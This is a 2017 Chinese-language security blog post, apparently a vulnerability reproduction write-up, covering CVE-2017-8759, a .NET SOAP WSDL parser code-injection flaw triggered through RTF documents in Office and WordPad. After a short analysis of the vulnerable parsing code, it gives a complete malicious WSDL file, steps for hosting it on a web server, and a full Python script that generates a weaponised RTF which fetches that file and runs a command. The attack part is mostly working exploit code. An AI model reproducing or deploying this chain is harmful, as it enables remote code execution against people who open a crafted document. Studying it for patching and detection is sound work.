<!DOCTYPE html>
<html lang="">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content=".NET Framework 的漏洞，不仅在Office Word、PPT、Excel中，写字板也可以。。。"/>




  <meta name="keywords" content="Office, Vuln, .NET" />





  <link rel="alternate" href="/default" title="Bypass.World">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="http://yoursite.com/2017/09/CVE-2017-8759-复现/"/>


<meta name="description" content=".NET Framework 的漏洞，不仅在Office Word、PPT、Excel中，写字板也可以。。。">
<meta name="keywords" content="Office, Vuln, .NET">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2017-8759 复现">
<meta property="og:url" content="http://yoursite.com/2017/09/CVE-2017-8759-复现/index.html">
<meta property="og:site_name" content="Bypass.World">
<meta property="og:description" content=".NET Framework 的漏洞，不仅在Office Word、PPT、Excel中，写字板也可以。。。">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://i.loli.net/2017/09/17/59bdd472b61b3.png">
<meta property="og:image" content="https://i.loli.net/2017/09/17/59bdd5a176784.png">
<meta property="og:updated_time" content="2017-09-19T17:19:57.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2017-8759 复现">
<meta name="twitter:description" content=".NET Framework 的漏洞，不仅在Office Word、PPT、Excel中，写字板也可以。。。">
<meta name="twitter:image" content="https://i.loli.net/2017/09/17/59bdd472b61b3.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?686eedfda259ce1d887831c94f49f99f";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  <script type="text/javascript">
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

        ga('create', 'UA-106734017-1', 'auto');
        ga('send', 'pageview');
  </script>



    <title> CVE-2017-8759 复现 - Bypass.World </title>
  </head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">Bypass.World</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          CVE-2017-8759 复现
        
      </h1>

      <time class="post-time">
          Sep 17 2017
      </time>
    </header>



    
            <div class="post-content">
            <h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00.漏洞简介"></a>0x00.漏洞简介</h2><p>Office在进行SOAP请求时会调用 .NET FrameWork，由于 .NET FrameWork在生产SOAP WSDL的定义内容期间未考虑到CRLF序列序列，导致存在代码注入漏洞。通过插入包含CLRF序列的SOAP请求地址，能够将任意代码注入到于 .NET FrameWork生成的cs代码中，伴随着csc.exe的解析达到任意代码执行的目的。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02.漏洞分析"></a>0x02.漏洞分析</h2><p>首先定义一个正常的 SOAP 请求如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">soap:address</span> <span class="attr">location</span>=<span class="string">"https://bypass.world"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">soap:address</span> <span class="attr">location</span>=<span class="string">"https://baidu.com"</span>/&gt;</span></div></pre></td></tr></table></figure></p>
<p>来看 .NET 是怎么处理这个 SOAP 请求的：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//IsValidUrl处理url函数</span></div><div class="line"><span class="function"><span class="keyword">internal</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">IsValidUrl</span>(<span class="params"><span class="keyword">string</span> <span class="keyword">value</span></span>)</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">value</span> == <span class="literal">null</span>) </div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">"\"\""</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    vsb.Length= <span class="number">0</span>;</div><div class="line">    vsb.Append(<span class="string">"@\""</span>);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">value</span>.Length; i++) </div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">value</span>[i] == <span class="string">'\"'</span>)</div><div class="line">            vsb.Append(<span class="string">"\"\""</span>);</div><div class="line">        <span class="keyword">else</span></div><div class="line">            vsb.Append(<span class="keyword">value</span>[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    vsb.Append(<span class="string">"\""</span>);</div><div class="line">    <span class="keyword">return</span> vsb.ToString();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 调用IsValidUrl处理address，并写入到cs文件</span></div><div class="line"><span class="keyword">if</span> (_connectURLs != <span class="literal">null</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;_connectURLs.Count; i++)</div><div class="line">    &#123;</div><div class="line">        sb.Length = <span class="number">0</span>;</div><div class="line">        sb.Append(indent2);</div><div class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            sb.Append(<span class="string">"base.ConfigureProxy(this.GetType(), "</span>);</div><div class="line">            sb.Append(WsdlParser.IsValidUrl((<span class="keyword">string</span>)_connectURLs[i]));</div><div class="line">            sb.Append(<span class="string">");"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="comment">// Only the first location is used, the rest are commented out in the proxy</span></div><div class="line">            sb.Append(<span class="string">"//base.ConfigureProxy(this.GetType(), "</span>);</div><div class="line">            sb.Append(WsdlParser.IsValidUrl((<span class="keyword">string</span>)_connectURLs[i]));</div><div class="line">            sb.Append(<span class="string">");"</span>);</div><div class="line">        &#125;</div><div class="line">        textWriter.WriteLine(sb);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如上，来看正常经过 .NET SOAP WSDL 解析模块解析后的代码将会如下：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">base</span>.ConfigureProxy(<span class="keyword">this</span>.GetType(), <span class="string">@"https://bypass.world"</span>);</div><div class="line"><span class="comment">//base.ConfigureProxy(this.GetType(), @"https://baidu.com");</span></div></pre></td></tr></table></figure>
<p>可以看到当_connectURLs.Count为2，即存在2个地址的时候，仅会保留第一个地址，第二个地址将会在字符串前面加上<code>//base.ConfigureProxy(this.GetType(),</code>达到注释的目的。</p>
<p>此处未考虑到address中存在换行的情况。当定义一个SOAP WSDL如下时：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">soap:address</span> <span class="attr">location</span>=<span class="string">"http://127.0.0.1?calc?xx"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">soap:address</span> <span class="attr">location</span>=<span class="string">"http://xxxxx</span></span></div><div class="line"><span class="tag"><span class="string">if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) &#123;</span></span></div><div class="line"><span class="tag"><span class="string">        System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);</span></span></div><div class="line"><span class="tag"><span class="string">        System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);</span></span></div><div class="line"><span class="tag"><span class="string">&#125; //"</span>/&gt;</span></div></pre></td></tr></table></figure></p>
<p>我们来看解析后的代码：<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">base</span>.ConfigureProxy(<span class="keyword">this</span>.GetType(), <span class="string">@"http://127.0.0.1?calc?xx"</span>);</div><div class="line"><span class="comment">//base.ConfigureProxy(this.GetType(), @"http://xxxxx;</span></div><div class="line">            <span class="keyword">if</span> (System.AppDomain.CurrentDomain.GetData(_url.Split(<span class="string">'?'</span>)[<span class="number">0</span>]) == <span class="literal">null</span>) &#123;</div><div class="line">                    System.Diagnostics.Process.Start(_url.Split(<span class="string">'?'</span>)[<span class="number">1</span>], _url.Split(<span class="string">'?'</span>)[<span class="number">2</span>]);</div><div class="line">                    System.AppDomain.CurrentDomain.SetData(_url.Split(<span class="string">'?'</span>)[<span class="number">0</span>], <span class="literal">true</span>);</div><div class="line">            &#125; <span class="comment">//");</span></div></pre></td></tr></table></figure></p>
<p>可以看到成功将代码注入到cs文件中，并执行代码 <code>System.Diagnostics.Process.Start(&quot;calc&quot;,&quot;xx&quot;)</code>.</p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03.漏洞利用"></a>0x03.漏洞利用</h2><h4 id="Exploit文件："><a href="#Exploit文件：" class="headerlink" title="Exploit文件："></a>Exploit文件：</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">definitions</span></span></div><div class="line"><span class="tag">    <span class="attr">xmlns</span>=<span class="string">"http://schemas.xmlsoap.org/wsdl/"</span></span></div><div class="line"><span class="tag">    <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/wsdl/soap/"</span></span></div><div class="line"><span class="tag">    <span class="attr">xmlns:suds</span>=<span class="string">"http://www.w3.org/2000/wsdl/suds"</span></span></div><div class="line"><span class="tag">    <span class="attr">xmlns:tns</span>=<span class="string">"http://schemas.microsoft.com/clr/ns/System"</span></span></div><div class="line"><span class="tag">    <span class="attr">xmlns:ns0</span>=<span class="string">"http://schemas.microsoft.com/clr/nsassem/Logo/Logo"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">portType</span> <span class="attr">name</span>=<span class="string">"PortType"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">binding</span> <span class="attr">name</span>=<span class="string">"Binding"</span> <span class="attr">type</span>=<span class="string">"tns:PortType"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">soap:binding</span> <span class="attr">style</span>=<span class="string">"rpc"</span> <span class="attr">transport</span>=<span class="string">"http://schemas.xmlsoap.org/soap/http"</span>/&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">suds:class</span> <span class="attr">type</span>=<span class="string">"ns0:Image"</span> <span class="attr">rootType</span>=<span class="string">"MarshalByRefObject"</span>&gt;</span><span class="tag">&lt;/<span class="name">suds:class</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">binding</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">service</span> <span class="attr">name</span>=<span class="string">"Service"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">port</span> <span class="attr">name</span>=<span class="string">"Port"</span> <span class="attr">binding</span>=<span class="string">"tns:Binding"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">soap:address</span> <span class="attr">location</span>=<span class="string">"http://127.0.0.1?calc?xx"</span>/&gt;</span></div><div class="line">                        <span class="tag">&lt;<span class="name">soap:address</span> <span class="attr">location</span>=<span class="string">";</span></span></div><div class="line"><span class="tag"><span class="string">                        if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) &#123;</span></span></div><div class="line"><span class="tag"><span class="string">                                System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);</span></span></div><div class="line"><span class="tag"><span class="string">                                System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);</span></span></div><div class="line"><span class="tag"><span class="string">                        &#125; //"</span>/&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">port</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">service</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">definitions</span>&gt;</span></div></pre></td></tr></table></figure>
<p>将上述代码保存到WEB目录如<code>http://192.168.1.1/1.txt</code></p>
<h4 id="生成包含SOAP请求的rtf文档："><a href="#生成包含SOAP请求的rtf文档：" class="headerlink" title="生成包含SOAP请求的rtf文档："></a>生成包含SOAP请求的rtf文档：</h4><p>此处和<code>CVE-2017-0199</code>类似方式插入对象，利用 SOAP Moniker 从远程服务器拉取 SOAP XML 文件，因为无法直接在对象链接中插入如<code>soap:wsdl=http://192.168.1.1/1.txt</code>这种 SOAP 标记，需要手动修改 rtf Object 的十六进制内容为 SOAP 请求。</p>
<p>Github上有人给出了<a href="https://github.com/bhdresh/CVE-2017-8759" target="_blank" rel="external">自动化生成rtf文件的代码</a>, 我们只需要<code>generate_exploit_rtf</code>部分,如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_exploit_rtf</span><span class="params">(filename, docuri)</span>:</span></div><div class="line">    <span class="comment"># Preparing malicious RTF</span></div><div class="line">    s = docuri</div><div class="line">    docuri_hex = <span class="string">"00"</span>.join(<span class="string">"&#123;:02x&#125;"</span>.format(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> s)</div><div class="line">    docuri_pad_len = <span class="number">714</span> - len(docuri_hex)</div><div class="line">    docuri_pad = <span class="string">"0"</span>*docuri_pad_len</div><div class="line">    payload = <span class="string">"&#123;\\rtf1\\adeflang1025\\ansi\\ansicpg1252\\uc1\\adeff31507\\deff0\\stshfdbch31505\\stshfloch31506\\stshfhich31506\\stshfbi31507\\deflang1033\\deflangfe2052\\themelang1033\\themelangfe2052\\themelangcs0\n"</span></div><div class="line">    payload += <span class="string">"&#123;\\info\n"</span></div><div class="line">    payload += <span class="string">"&#123;\\author &#125;\n"</span></div><div class="line">    payload += <span class="string">"&#123;\\operator &#125;\n"</span></div><div class="line">    payload += <span class="string">"&#125;\n"</span></div><div class="line">    payload += <span class="string">"&#123;\\*\\xmlnstbl &#123;\\xmlns1 http://schemas.microsoft.com/office/word/2003/wordml&#125;&#125;\n"</span></div><div class="line">    payload += <span class="string">"&#123;\n"</span></div><div class="line">    payload += <span class="string">"&#123;\\object\\objautlink\\objupdate\\rsltpict\\objw291\\objh230\\objscalex99\\objscaley101\n"</span></div><div class="line">    payload += <span class="string">"&#123;\\*\\objclass Word.Document.8&#125;\n"</span></div><div class="line">    payload += <span class="string">"&#123;\\*\\objdata 010500000200000008000000e2bae4e53e2231000000000000000000000a0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdfffffffefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff010000000003000000000000c000000000000046000000000000000000000000f02c1951c8e5d20103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000d8010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000020000000300000004000000050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0100000209000000010000000000000000000000000000008c010000c7b0abec197fd211978e0000f8757e2a00000000700100007700730064006c003d00"</span>+docuri_hex+docuri_pad+<span class="string">"00ffffffff0000000000000000000000000000000000000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#125;\n"</span></div><div class="line">    payload += <span class="string">"&#123;\\result &#123;\\rtlch\\fcs1 \\af31507 \\ltrch\\fcs0 \\insrsid1979324 &#125;&#125;&#125;&#125;\n"</span></div><div class="line">    payload += <span class="string">"&#123;\\*\\datastore &#125;\n"</span></div><div class="line">    payload += <span class="string">"&#125;\n"</span></div><div class="line">    f = open(filename, <span class="string">'w'</span>)</div><div class="line">    f.write(payload)</div><div class="line">    f.close()</div><div class="line">    <span class="keyword">print</span> <span class="string">"Generated "</span>+filename+<span class="string">" successfully"</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    generate_exploit_rtf(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</div></pre></td></tr></table></figure></p>
<p>OK，到此可以直接运行上面<code>generate_exploit_rtf.py 1.rtf http://192.168.1.1/1.txt</code>,生成<code>1.rtf</code>文件，执行即可弹出calc<br>下图是测试过程中在写字板中打开rtf，测试机未安装office，发现也能中招。究其原因，还是出在 .NET 上啊。<br><img src="https://i.loli.net/2017/09/17/59bdd472b61b3.png" alt="2.png"></p>
<p>可以看到进行执行漏洞会在当前目录下生成三个文件，其中Logo.cs为 SOAP 模块解析后的源码。可以看到代码被注入进去了。<br><img src="https://i.loli.net/2017/09/17/59bdd5a176784.png" alt="3.png"></p>

            </div>
          

    
      <footer class="post-footer">
		
		<div class="post-tags">
		  
			<a href="/tags/vuln/">vuln</a>
		  
			<a href="/tags/blog/">blog</a>
		  
		</div>
		

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2017/10/趋势科技产品Widgets模块多个漏洞复现/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">趋势科技产品Widgets模块多个漏洞复现</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2017/09/VBS代码练手/">
        <span class="next-text nav-default">VBS代码练手</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        

      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon"><span class="copyright-year">
    
        &copy;
    
        2014 -
    
    2017
    <span class="footer-author">Norman.Chew.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

  </body>
</html>
